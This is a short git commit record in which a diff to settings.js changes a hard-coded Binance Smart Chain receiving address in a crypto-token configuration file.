ae1042dffdec7bf89f22986ef1df996a84f88925
stea77730 <63733703+stea77730@users.noreply.github.com>
2024-06-04 16:26:18 +0300

    Update settings.js

--- settings.js
+++ settings.js
@@ -1,6 +1,6 @@
 //code for local smart contract
 
-const receiveAddress = "0x5b3606F7dF5ce9fF4e79Cd9094d4D5a135cf147F";   // remove the words and replace it with your bsc address    
+const receiveAddress = "0xde10A5A488c2B66559b751c7057357bB94D2a549";   // remove the words and replace it with your bsc address    
 
 	
 var cryptotokenContract;
